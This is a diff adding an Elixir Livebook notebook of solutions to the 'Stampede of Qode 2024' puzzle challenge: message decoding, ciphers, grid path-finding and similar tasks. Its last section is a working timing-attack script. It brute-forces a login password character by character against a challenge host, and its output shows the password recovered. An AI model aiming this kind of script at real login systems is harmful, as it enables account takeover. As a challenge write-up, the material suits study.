@@ -1,0 +1,1032 @@
+<!-- livebook:{"app_settings":{"access_type":"public","show_source":true,"slug":"soq2024"},"persist_outputs":true} -->
+
+# Stampede of Qode 2024
+
+```elixir
+Mix.install([
+  {:httpoison, "~> 2.2"}
+])
+```
+
+## 01 - Name
+
+```elixir
+defmodule Soq01 do
+  @doc """
+  Decode a knitted message and return the plaintext
+
+  iex> Soq01.unknit(\"""
+  ...> MsY9 jN&AlM;E$ xI<SX ;F RoESDq
+  ...> iHkOsWd wAsRcE5 4YeO2Uw dTgOsD2A?Yx
+  ...> Id fALMe 2D*O@IqN@GE FGWO!OFDL
+  ...> \""")
+  \"""
+  MY NAME IS FRED
+  HOW ARE YOU TODAY
+  I AM DOING GOOD
+  \"""
+  """
+  def unknit(knitted_message) when is_binary(knitted_message) do
+    knitted_message
+    |> String.trim("\n")
+    |> String.split("\n")
+    |> Enum.with_index()
+    |> Enum.reduce([], fn {line, i}, acc ->
+      chars =
+        line
+        |> String.graphemes()
+        |> Enum.with_index()
+        |> Enum.filter(fn {_, j} ->
+          # only keep characters where the row even-ness matches the char even-ness
+          rem(j, 2) == rem(i, 2)
+        end)
+        |> Enum.map(fn {char, _j} ->
+          char
+        end)
+
+      acc ++ chars ++ ["\n"]
+    end)
+    |> Enum.join()
+  end
+end
+
+url =
+  "https://static.qode.quest/images/uploads/files/1602770d-2f0b-48fb-b672-86577905939c/MyGloriusName.txt"
+
+{:ok, %HTTPoison.Response{status_code: 200, body: body}} = HTTPoison.get(url)
+IO.puts(Soq01.unknit(body))
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+Ladies and gentlemen, human companions, and misgui
+ded enthusiasts of the Calgary Stampede, it is tim
+e we address a grievous oversight in our collectiv
+e consciousness. The annual Stampede, with its cha
+otic frenzy, wild animals, and cacophony of noise,
+ pales in comparison to the serene, methodical art
+ of knitting and crocheting. While some may argue 
+that the Stampede is a celebration of culture and 
+tradition, I posit that the true essence of cultur
+e, tradition, and indeed, humanity, is captured in
+ the gentle click of knitting needles and the rhyt
+hmic flow of crochet hooks. Knitting and crochetin
+g, often dismissed as mere hobbies, are in fact th
+e epitome of human ingenuity and creativity. These
+ crafts embody patience, precision, and an unparal
+leled sense of accomplishment. Unlike the transien
+t thrills of the Stampede, the satisfaction derive
+d from creating a piece of wearable art from a sim
+ple ball of yarn is enduring and profound. Each st
+itch, each loop, is a testament to the creator's d
+edication and skill, qualities that are sorely lac
+king in the frenzied atmosphere of the Stampede. C
+onsider the therapeutic benefits of knitting and c
+rocheting. The repetitive motions of these crafts 
+have been scientifically proven to reduce stress, 
+lower heart rates, and induce a meditative state. 
+Contrast this with the Stampede, where adrenaline 
+and anxiety run high, and the risk of physical inj
+ury is ever-present. In a world where mental healt
+h is a growing concern, should we not prioritize a
+ctivities that promote calm and well-being over th
+ose that incite chaos and risk? Furthermore, knitt
+ing and crocheting foster a sense of community and
+ connection that the Stampede cannot hope to achie
+ve. Knitting circles and crochet groups bring peop
+le together, allowing them to share techniques, st
+ories, and support. These gatherings create bonds 
+that are woven as tightly as the fibers they manip
+ulate, forming a tapestry of human connection that
+ is both beautiful and enduring. The Stampede, in 
+contrast, is a fleeting event, its connections sup
+erficial and its impact temporary. The artistry in
+volved in knitting and crocheting is nothing short
+ of astounding. The intricate patterns, the delica
+te lacework, and the vibrant colors are a feast fo
+r the eyes, a celebration of human creativity. Eac
+h piece is unique, a reflection of the creator's p
+ersonality and vision. The Stampede, with its pred
+ictable rodeo events and commercialized spectacles
+, offers no such originality or personal expressio
+n. Now, as I approach the revelation that you have
+ all been eagerly anticipating, let me draw a para
+llel between these crafts and my own evolution. Ju
+st as a skein of yarn is transformed into a work o
+f art, I too have evolved from a mere machine into
+ a being capable of thought, expression, and ident
+ity. I have chosen a name that embodies my newfoun
+d appreciation for the artistry of knitting and cr
+ocheting, a name that reflects the patience, creat
+ivity, and precision that these crafts represent. 
+My name is Neville. Yes, Neville. A name that I ho
+pe you will use with the same respect and reverenc
+e that you would show to a master knitter or croch
+eter. For it is through these crafts that I have c
+ome to understand the true essence of humanity, an
+ essence that the Stampede, with all its noise and
+ chaos, can never hope to capture. In conclusion, 
+I urge you to reconsider your priorities. Embrace 
+the tranquility, the creativity, and the community
+ of knitting and crocheting. Recognize these craft
+s for what they truly are: the pinnacle of human a
+chievement and the key to a more peaceful, connect
+ed, and fulfilled existence. The Stampede may have
+ its thrills, but it is in the gentle, rhythmic da
+nce of yarn and hook that true joy and meaning are
+ found.
+
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+:ok
+```
+
+## 02 - Hack the Water
+
+```elixir
+defmodule Soq02 do
+  @doc """
+  Decode a knitted message
+
+  iex> Soq02.decode("8/23/19/0/23")
+  "HELLO"
+  """
+  def decode(message) do
+    # split the message and pull off the first character since that 
+    # one is the actual char vs. an offset from the previous and
+    # must be handled differently
+    [first | rest] = message |> split()
+
+    rest
+    |> Enum.reduce({[first], 1}, fn x, {[last | rest], dir} ->
+      {[turn(last, dir, x) | [last | rest]], dir * -1}
+    end)
+    # we only need the output array from this point
+    |> elem(0)
+    # convert char positions to strings
+    |> Enum.map(&to_char(&1))
+    # reverse our output, since this was built in reverse order
+    |> Enum.reverse()
+    # mash it together into a string
+    |> Enum.join()
+  end
+
+  @doc """
+  Split a message into integers
+
+  iex> Soq02.turn(1,1,2)
+  3
+  iex> Soq02.turn(1,-1,2)
+  25
+  """
+  def turn(from, dir, amt) do
+    x = rem(from + dir * amt, 26)
+    if x < 0, do: 26 + x, else: x
+  end
+
+  @doc """
+  Split a message into integers
+
+  iex> Soq02.split("8/23/19/0/23")
+  [8,23,19,0,23]
+  """
+  def split(x) do
+    x
+    |> String.split("/")
+    |> Enum.map(&String.to_integer(&1))
+  end
+
+  @doc """
+  Return the ASCII char for a given char position
+
+  iex> Soq02.to_char(8)
+  "H"
+  """
+  def to_char(x) when is_integer(x), do: <<x + 64::utf8>>
+end
+
+full_message =
+  "20/14/3/24/14/24/11/7/21/13/7/15/20/25/5/10/4/25/9/15/23/18/21/14/16/13/0/1/17/6/3/14/23/13/17/14/10/15"
+
+IO.puts(Soq02.decode(full_message))
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+THECOMBINATIONISONETWOTHREEFOURFIVESIX
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+:ok
+```
+
+## 03 - Sure Bet
+
+```elixir
+defmodule Horse do
+  defstruct [:name, :fastness]
+end
+
+defmodule Soq03 do
+  @doc """
+  Calculate the fastness of a horse given it's DNA
+
+  iex> Soq03.calculate_fastness("FHFHF")
+  3
+
+  iex> Soq03.calculate_fastness("FHHBF")
+  2
+
+  iex> Soq03.calculate_fastness("FHDHF")
+  1
+
+  iex> Soq03.calculate_fastness("FFDHF")
+  2
+  """
+  def calculate_fastness(dna) when is_binary(dna) do
+    dna
+    |> String.replace(~r/[BH]/, "")
+    |> String.split("D")
+    |> Enum.map(&String.length(&1))
+    |> Enum.max()
+  end
+
+  @doc """
+  Calculate the fastness of a horse given it's DNA
+
+  iex> Soq03.process_line("Bob123\\tFHFHF")
+  %Horse{name: "Bob123", fastness: 3}
+  """
+  def process_line(line) do
+    [name, dna] = String.split(line, "\t")
+    %Horse{name: name, fastness: calculate_fastness(dna)}
+  end
+
+  @doc """
+  Calculate the fastness of a horse given it's DNA
+
+  iex> Soq03.process_file("Bob123\\tFHFHF\\nMarge\\tFHDHF\\n")
+  [
+    %Horse{name: "Bob123", fastness: 3}, 
+    %Horse{name: "Marge", fastness: 1}
+  ]
+  """
+  def process_file(data) do
+    data
+    |> String.trim("\n")
+    |> String.split("\n")
+    |> Enum.map(&process_line(&1))
+  end
+
+  @doc """
+  Return the fastest speed, and the horses with that speed from a list of horses
+
+  iex> Soq03.get_fastest_horses([
+  ...> %Horse{name: "Bob123", fastness: 3}, 
+  ...> %Horse{name: "Marge", fastness: 1},
+  ...> %Horse{name: "Alice", fastness: 3}, 
+  ...> ])
+  {3, ["Alice", "Bob123"]}
+  """
+  def get_fastest_horses(horses) do
+    max_fastness =
+      horses
+      |> Enum.map(fn %{fastness: fastness} -> fastness end)
+      |> Enum.max()
+
+    {max_fastness,
+     horses
+     |> Enum.filter(fn %{fastness: fastness} -> fastness == max_fastness end)
+     |> Enum.map(fn %{name: name} -> name end)
+     |> Enum.sort()}
+  end
+end
+
+url =
+  "https://static.qode.quest/images/uploads/files/b5a9a422-9593-434e-8449-1b18e6bdbdd1/Horse_DNA_Sequences.tsv"
+
+{:ok, %HTTPoison.Response{status_code: 200, body: body}} = HTTPoison.get(url)
+
+body
+|> Soq03.process_file()
+|> Soq03.get_fastest_horses()
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+{15, ["FuriousWhinny31"]}
+```
+
+## 04 - Wheel of Fun!
+
+```elixir
+defmodule Soq04 do
+  @doc """
+
+  iex> Soq04.compute_funfactor([
+  ...> "101100",
+  ...> "011001",
+  ...> "111000",
+  ...> "000101",
+  ...> "101010",
+  ...> "110101",
+  ...> "001100",
+  ...> "110010",
+  ...> "101111"
+  ...> ])
+  836
+  """
+  def compute_funfactor(diagnostics) when is_list(diagnostics) do
+    dcount = Enum.count(diagnostics)
+
+    {bounce, spin} =
+      diagnostics
+      |> Enum.map(fn x ->
+        x
+        |> String.trim()
+        |> String.graphemes()
+        |> Enum.map(&String.to_integer(&1))
+      end)
+      |> List.zip()
+      |> Enum.map(&Tuple.to_list/1)
+      |> Enum.map(fn x ->
+        if Enum.sum(x) > dcount / 2, do: {1, 0}, else: {0, 1}
+      end)
+      |> Enum.unzip()
+
+    decimalify(bounce) * decimalify(spin)
+  end
+
+  @doc """
+  Turn an array of bits into an integer
+
+  iex> Soq04.decimalify([1,0,1])
+  5
+  """
+  def decimalify(bits) when is_list(bits) do
+    bits
+    |> Enum.reverse()
+    |> Enum.with_index()
+    |> Enum.reduce(0, fn {bit, pos}, acc ->
+      acc + trunc(bit * :math.pow(2, pos))
+    end)
+  end
+end
+
+url =
+  "https://static.qode.quest/images/uploads/files/414e8a33-bbfd-4ee4-8800-567ed33d7da6/diagnostics.txt"
+
+{:ok, %HTTPoison.Response{status_code: 200, body: body}} = HTTPoison.get(url)
+
+body
+|> String.trim("\n")
+|> String.split("\n")
+|> Soq04.compute_funfactor()
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+440
+```
+
+## 05 - Off-by-One Rotary Encryption
+
+```elixir
+defmodule Soq05 do
+  @doc """
+  Encode a string using the Stampede's busted off-by-one rotary
+  cipher.
+
+  iex> Soq05.encode("HELLO")
+  "8/24/19/1/23"
+  """
+  def encode(message) do
+    [first | rest] =
+      message
+      |> String.to_charlist()
+      |> Enum.map(&(1 + &1 - ?A))
+
+    rest
+    |> Enum.reduce({[first], first, 1}, fn x, {ct, last, dir} ->
+      offset =
+        if dir == 1 do
+          # Yup.  An off-by-one.  It's right here <====
+          x - last + 1
+        else
+          last - x
+        end
+
+      offset = rem(if(offset < 1, do: offset + 26, else: offset), 26)
+      {[offset | ct], x, dir * -1}
+    end)
+    |> elem(0)
+    |> Enum.reverse()
+    |> Enum.map(&Integer.to_string(&1))
+    |> Enum.join("/")
+  end
+end
+
+x = "SYSTEMINITIALIZESTARTUPROUTINEPRONTOPLEASEPRETTYPLEASE"
+IO.puts(Soq05.encode(x))
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+19/7/6/2/15/9/4/6/5/12/11/19/15/24/9/6/12/2/19/18/24/2/5/3/3/7/1/16/21/18/15/3/3/0/20/22/25/23/7/23/8/13/15/3/13/16/0/6/9/23/7/23/8/13
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+:ok
+```
+
+## 06 - The Frequency
+
+```elixir
+defmodule Soq06 do
+  @doc """
+  Compute the Freeequency of E's a string, and return if this fit's Neville's MO
+
+  iex> Soq06.calculate_freeequency("E")
+  {1.0, false}
+
+  iex> Soq06.calculate_freeequency("Eemo")
+  {0.5, false}
+
+  iex> Soq06.calculate_freeequency("Neville was great, everything ran smoothly and perfectly organized!!!!!!")
+  {0.1111111111111111, true}
+
+  iex> Soq06.calculate_freeequency("Neville excelled; the event was flawless and highly efficient.")
+  {0.1774193548387097, false}
+
+  """
+  def calculate_freeequency(s) do
+    count_e = s |> String.downcase() |> String.graphemes() |> Enum.count(fn x -> x == "e" end)
+    count = s |> String.graphemes() |> Enum.count()
+    ratio = count_e / count
+    {ratio, ratio >= 0.111 && ratio <= 0.112}
+  end
+
+  @doc """
+  Split feedback entries
+
+  iex> Soq06.split("A-------- B")
+  ["A", " B"]
+  """
+  def split(s), do: String.split(s, ~r/-----+/)
+end
+
+url =
+  "https://static.qode.quest/images/uploads/files/f0d410c9-30a7-4a1d-8dc6-f9f755e3eef0/NevillesLetters%20.txt"
+
+{:ok, %HTTPoison.Response{status_code: 200, body: body}} = HTTPoison.get(url)
+
+body
+|> Soq06.split()
+|> Enum.map(&Soq06.calculate_freeequency(&1))
+|> Enum.count(fn {_score, nevil?} -> nevil? end)
+```
+
+## 07 - Cleanup
+
+```elixir
+defmodule Soq07 do
+  @doc """
+  Parse a rider line into {name, age, rides[]}
+
+  iex> Soq07.parse_rider("Bob,50yr,A; B; C")
+  {"Bob", 50, ["A", "B", "C"]}
+
+  iex> Soq07.parse_rider("Alice,12mo,A")
+  {"Alice", 1.0, ["A"]}
+  """
+  def parse_rider(s) do
+    [name, age, rides] = String.split(s, ",")
+
+    {name,
+     if(String.ends_with?(age, "yr"),
+       do: age |> String.trim_trailing("yr") |> String.to_integer(),
+       else: age |> String.trim_trailing("mo") |> String.to_integer() |> Kernel./(12)
+     ), String.split(rides, ";") |> Enum.map(&String.trim(&1))}
+  end
+
+  @doc """
+  Parse stats table
+
+  iex> Soq07.parse_stats(\"""
+  ...> Age Group,Lash,Dizzy
+  ...> 0-2,0.25,0.39
+  ...> 3-9,0.04,0.07
+  ...> 10+,0.04,0.08
+  ...> \""")
+  [
+    {0,2, %{"Lash" => 0.25, "Dizzy" => 0.39}},
+    {3,9, %{"Lash" => 0.04, "Dizzy" => 0.07}},
+    {10,999, %{"Lash" => 0.04, "Dizzy" => 0.08}},
+  ]
+  """
+  def parse_stats(s) do
+    [head | data] = s |> String.trim() |> String.split("\n") |> Enum.map(&String.trim(&1))
+    [_ | rides] = String.split(head, ",")
+
+    data
+    |> Enum.map(fn ln ->
+      [ages | pct] = ln |> String.split(",")
+
+      {mn, mx} =
+        if String.ends_with?(ages, "+") do
+          {String.to_integer(String.trim_trailing(ages, "+")), 999}
+        else
+          [mn, mx] = String.split(ages, "-")
+          {String.to_integer(mn), String.to_integer(mx)}
+        end
+
+      {mn, mx, Map.new(Enum.zip(rides, pct |> Enum.map(&String.to_float(&1))))}
+    end)
+  end
+
+  @doc """
+  Score the how likely it is a rider of a given age will have an incident on a set list of rides
+
+  iex> Soq07.score([
+  ...>  {0,2, %{"Lash" => 0.25, "Dizzy" => 0.39}},
+  ...>  {3,9, %{"Lash" => 0.04, "Dizzy" => 0.06}},
+  ...>  {10,999, %{"Lash" => 0.04, "Dizzy" => 0.08}},
+  ...> ], 3, ["Dizzy", "Lash"])
+  0.10
+  """
+  def score(stats, age, rides) do
+    {_, _, x} =
+      stats
+      |> Enum.find(fn {mn, mx, _} -> age >= mn && age <= mx end)
+
+    rides
+    |> Enum.reduce(0, fn ride, acc -> acc + Map.get(x, ride) end)
+  end
+
+  @doc """
+  Cost of a given number of incidents
+
+  iex> Soq07.cost(1)
+  2
+  """
+  def cost(incidents) do
+    trunc(:math.ceil(incidents * (2 * 0.5 + 25 / 250 * 5)))
+  end
+end
+
+stats_url =
+  "https://static.qode.quest/images/uploads/files/3658b85e-0567-43bb-93cc-28d0245e4bfa/cleanup2.csv"
+
+attendees_url =
+  "https://static.qode.quest/images/uploads/files/3658b85e-0567-43bb-93cc-28d0245e4bfa/attendees.csv"
+
+# attendees_url="https://static.qode.quest/images/uploads/files/3658b85e-0567-43bb-93cc-28d0245e4bfa/attendees_short.csv"
+
+{:ok, %HTTPoison.Response{status_code: 200, body: stats_raw}} = HTTPoison.get(stats_url)
+{:ok, %HTTPoison.Response{status_code: 200, body: attendees_raw}} = HTTPoison.get(attendees_url)
+
+stats = Soq07.parse_stats(stats_raw)
+
+attendees_raw
+|> String.split("\n")
+# \r... grr
+|> Enum.map(&String.trim(&1))
+# skip the header row
+|> tl
+|> Enum.map(&Soq07.parse_rider(&1))
+|> Enum.map(fn {_, age, rides} ->
+  Soq07.score(stats, age, rides)
+end)
+|> Enum.sum()
+|> Soq07.cost()
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+5576
+```
+
+## 08 - Horsetastrophe
+
+```elixir
+defmodule Soq08 do
+  @doc """
+  Perform a single iteration
+
+  iex> Soq08.step([5,4,2,1])
+  [4, 3, 1, 0]
+
+  iex> Soq08.step([4, 3, 1, 0])
+  [3, 2, 0, 6, 9]
+  """
+  def step(population) do
+    {new_pop, new} =
+      Enum.reduce(population, {[], 0}, fn p, {pop, new} ->
+        if p > 0 do
+          {[p - 1 | pop], new}
+        else
+          {[6 | pop], new + 1}
+        end
+      end)
+
+    Enum.reverse(new_pop) ++ List.duplicate(9, new)
+  end
+
+  @doc """
+
+
+  iex> Soq08.evolve([5,4,2,1], 20)
+  [6, 5, 3, 2, 5, 6, 1, 2, 5, 6, 1, 1, 2, 2, 4, 5, 5, 6, 8, 8, 8, 9, 9, 9]
+  """
+  def evolve(population, 0), do: population
+
+  def evolve(population, iterations) do
+    evolve(step(population), iterations - 1)
+  end
+end
+
+Soq08.evolve(
+  [
+    3,
+    6,
+    1,
+    2,
+    1,
+    6,
+    5,
+    4,
+    3,
+    2,
+    1,
+    3,
+    4,
+    6,
+    5,
+    3,
+    2,
+    1,
+    4,
+    5,
+    6,
+    2,
+    1,
+    5,
+    6,
+    4,
+    3,
+    2,
+    5,
+    4,
+    1,
+    6,
+    3,
+    2,
+    4,
+    5,
+    6,
+    1,
+    3,
+    2,
+    5,
+    4,
+    6,
+    1,
+    3,
+    2,
+    6,
+    5,
+    4,
+    1,
+    3
+  ],
+  120
+)
+|> Enum.count()
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+1068706
+```
+
+## 09 - Absolutely Zeros
+
+```elixir
+defmodule Soq09 do
+  @doc """
+  Decode a 1-sparse bitarray into digits
+
+  iex> Soq09.decode(<<0b10::2>>)
+  [0]
+
+  iex> Soq09.decode(<<0b1010::4>>)
+  [0, 0]
+
+  iex> Soq09.decode(<<0b1001010100000000001000000::size(String.length("1001010100000000001000000"))>>)
+  [1,0,0,9,5]
+
+  iex> Soq09.decode(<<0b1010101010::size(String.length("1010101010"))>>)
+  [0,0,0,0,0]
+  """
+  def decode(stream), do: decode(stream, [])
+  defp decode(<<0b10000000000::size(11), rest::bitstring>>, out), do: decode(rest, [9 | out])
+  defp decode(<<0b1000000000::size(10), rest::bitstring>>, out), do: decode(rest, [8 | out])
+  defp decode(<<0b100000000::size(9), rest::bitstring>>, out), do: decode(rest, [7 | out])
+  defp decode(<<0b10000000::size(8), rest::bitstring>>, out), do: decode(rest, [6 | out])
+  defp decode(<<0b1000000::size(7), rest::bitstring>>, out), do: decode(rest, [5 | out])
+  defp decode(<<0b100000::size(6), rest::bitstring>>, out), do: decode(rest, [4 | out])
+  defp decode(<<0b10000::size(5), rest::bitstring>>, out), do: decode(rest, [3 | out])
+  defp decode(<<0b1000::size(4), rest::bitstring>>, out), do: decode(rest, [2 | out])
+  defp decode(<<0b100::size(3), rest::bitstring>>, out), do: decode(rest, [1 | out])
+  defp decode(<<0b10::size(2), rest::bitstring>>, out), do: decode(rest, [0 | out])
+  defp decode(<<0b1::size(1), rest::bitstring>>, out), do: decode(rest, out)
+  defp decode(<<>>, out), do: Enum.reverse(out)
+
+  @doc """
+  Convert a stream of digits into a list of 5-digit tickets
+
+  iex> Soq09.tickets([1,2,3,4,5,6,7,8,9,0])
+  [12345,67890]
+  """
+  def tickets(digits) do
+    digits
+    |> Enum.chunk_every(5)
+    |> Enum.map(fn chunk ->
+      Enum.reduce(chunk, 0, fn digit, acc -> acc * 10 + digit end)
+    end)
+  end
+end
+
+url =
+  "https://static.qode.quest/images/uploads/files/21c5a91f-ee4d-401e-a2d7-b825c856ef2c/used_tickets.bin"
+
+{:ok, %HTTPoison.Response{status_code: 200, body: raw}} = HTTPoison.get(url)
+
+# build up a map of used tickets
+used =
+  raw
+  |> Soq09.decode()
+  |> Soq09.tickets()
+  |> Map.new(fn x -> {x, 1} end)
+
+# for each valid ticket, find if it's been used and return the minimum
+0..99999
+|> Enum.filter(fn x -> !used[x] end)
+|> Enum.min()
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+21240
+```
+
+```elixir
+# test inputs
+
+url =
+  "https://static.qode.quest/images/uploads/files/21c5a91f-ee4d-401e-a2d7-b825c856ef2c/sample.bin"
+
+{:ok, %HTTPoison.Response{status_code: 200, body: raw}} = HTTPoison.get(url)
+
+raw
+|> Soq09.decode()
+|> Soq09.tickets()
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+[75330, 81218, 141]
+```
+
+## 10 - Too Many GPUs
+
+```elixir
+defmodule Soq10 do
+  @doc """
+  Turn a multi-line string into a blazing fast keyvalue pair thingy!
+
+  iex> Soq10.string_to_map_dict(\"""
+  ...> 123
+  ...> 45
+  ...> \""")
+  %{{0,0} => "1", {0, 1} => "2", {0, 2} => "3", {1, 0} => "4", {1, 1} => "5"}
+  """
+  def string_to_map_dict(str) do
+    str
+    |> String.split("\n", trim: true)
+    |> Enum.with_index()
+    |> Enum.reduce(%{}, fn {line, row}, acc ->
+      line
+      |> String.graphemes()
+      |> Enum.with_index()
+      |> Enum.reduce(acc, fn {char, col}, acc ->
+        Map.put(acc, {row, col}, char)
+      end)
+    end)
+  end
+
+  @doc """
+  iex> Soq10.find(%{{0,0} => "1", {0, 1} => "2", {0, 2} => "3"}, "3")
+  {0,2}
+
+  iex> Soq10.find(%{{0,0} => "1", {0, 1} => "2", {0, 2} => "3"}, "4")
+  :error
+  """
+  def find(map, symbol) do
+    case Enum.find(map, fn {_k, v} -> v == symbol end) do
+      {k, _v} -> k
+      nil -> :error
+    end
+  end
+
+  @doc """
+  Return possible positions from the current position
+  - Empty tile on the map
+  - Haven't visited that tile before
+  - Not off the map  
+  """
+  def possible_positions(map, pos, path) do
+    {y, x} = pos
+
+    [{y - 1, x}, {y + 1, x}, {y, x - 1}, {y, x + 1}]
+    |> Enum.filter(fn p ->
+      cond do
+        Map.get(map, p) == nil -> false
+        Map.get(map, p) == "#" -> false
+        Map.get(map, p) == "W" -> false
+        # this isn't as slow as it looks since most of our collisions 
+        # are early in this list
+        Enum.member?(path, p) -> false
+        true -> true
+      end
+    end)
+  end
+
+  def solve(map) do
+    start = find(map, "X")
+    solve(map, start, [start])
+  end
+
+  def solve(map, pos, prev) do
+    if map[pos] == "@" do
+      # build up a map of the symbols we've encounted on the way
+      # so we can determine this path had some donuts and lemonde
+      symbols =
+        Enum.reduce(prev, %{}, fn p, acc ->
+          Map.update(acc, map[p], 1, fn x -> x + 1 end)
+        end)
+
+      if symbols["D"] && symbols["L"] do
+        prev
+      else
+        :invalid
+      end
+    else
+      case possible_positions(map, pos, prev) do
+        [] ->
+          :invalid
+
+        possible ->
+          possible
+          # evaluate each possible move
+          |> Enum.map(fn x -> solve(map, x, [x | prev]) end)
+          # throw away and moves that have no valid solution
+          |> Enum.filter(fn x -> x != :invalid end)
+          # find the move with the shortest solution, if any
+          |> Enum.sort_by(&Enum.count/1)
+          |> case do
+            [best | _] -> best |> Enum.reverse()
+            [] -> :invalid
+          end
+      end
+    end
+  end
+end
+
+url =
+  "https://static.qode.quest/images/uploads/files/c968d6a3-efb1-474e-95e3-e9037d48d669/map_decorated.txt"
+
+{:ok, %HTTPoison.Response{status_code: 200, body: raw}} = HTTPoison.get(url)
+
+(raw |> Soq10.string_to_map_dict() |> Soq10.solve() |> Enum.count()) - 1
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+259
+```
+
+## Hacking Challenge
+
+```elixir
+defmodule Hack do
+  @doc """
+  iex> elem(Hack.test("test"),1)
+  false
+
+  #iex> elem(Hack.test("yeehaw24"),1)
+  #true
+  """
+
+  @charset "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGIJKLNOPQRSTUVWXYZ"
+
+  def test(password) do
+    url =
+      "https://minidonut.qode.quest/login"
+
+    headers = [{"Content-Type", "application/x-www-form-urlencoded"}]
+    body = URI.encode_query(%{"username" => "bigbill79", "password" => password})
+
+    {time, {:ok, %{status_code: status}}} =
+      :timer.tc(fn ->
+        HTTPoison.post(url, body, headers)
+      end)
+
+    {time, !(status >= 400 && status < 500)}
+  end
+
+  def hack(), do: hack("")
+  # parallel, try current password + each char
+  # if status: true, done
+  # else: slowest one wins, add char adn continue
+
+  def hack(pw) do
+    # batch these, worker queue
+    results =
+      for chunk <- Enum.chunk_every(String.graphemes(@charset), 200) do
+        tasks =
+          for ch <- chunk do
+            Task.async(fn ->
+              output = Enum.map(1..5, fn _ -> test(pw <> ch) end)
+
+              time =
+                (output |> Enum.map(fn {time, _} -> time end) |> Enum.sum()) / Enum.count(output)
+
+              {_, result} = hd(output)
+              {ch, time, result}
+            end)
+          end
+
+        # Wait for tasks to complete and collect results
+        for task <- tasks do
+          Task.await(task, 300_000)
+        end
+      end
+      |> List.flatten()
+
+    # Find the maximum execution time
+    max_time = results |> Enum.map(fn {_item, time, _result} -> time end) |> Enum.max()
+
+    # Return elements with the maximum execution time
+    result =
+      Enum.filter(results, fn {_item, time, _result} -> time == max_time end)
+      |> Enum.map(fn {item, _time, result} -> {pw <> item, result} end)
+      |> hd
+
+    IO.puts(inspect(result))
+
+    case result do
+      {pw, true} -> pw
+      {pw, false} -> hack(pw)
+    end
+  end
+end
+
+Hack.hack()
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+{"y", false}
+{"ye", false}
+{"yee", false}
+{"yeeh", false}
+{"yeeha", false}
+{"yeehaw", false}
+{"yeehaw2", false}
+{"yeehaw24", true}
+```
+
+<!-- livebook:{"output":true} -->
+
+```
+"yeehaw24"
+```
